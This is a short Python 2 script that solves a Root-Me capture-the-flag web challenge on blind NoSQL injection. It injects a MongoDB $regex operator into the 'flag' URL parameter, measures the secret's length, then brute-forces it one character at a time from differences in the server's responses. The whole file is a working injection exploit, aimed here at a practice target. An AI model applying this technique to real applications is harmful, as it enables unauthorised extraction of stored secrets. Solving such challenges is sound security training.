import requests
import string

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+ '
flag=''
length=0

for i in range(1,30):
	r = requests.get("http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=.{"+ str(i) +"}")
	print "Length: " + str(i)
	if "not" in r.text:
		length = i
		break


for k in range(1, length):
	for c in chars:
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^"+ flag + c)
		# print "flag: " + flag + c
		if "not" not in r.text:
			flag = flag + c
			print "Flag: " + flag
			break
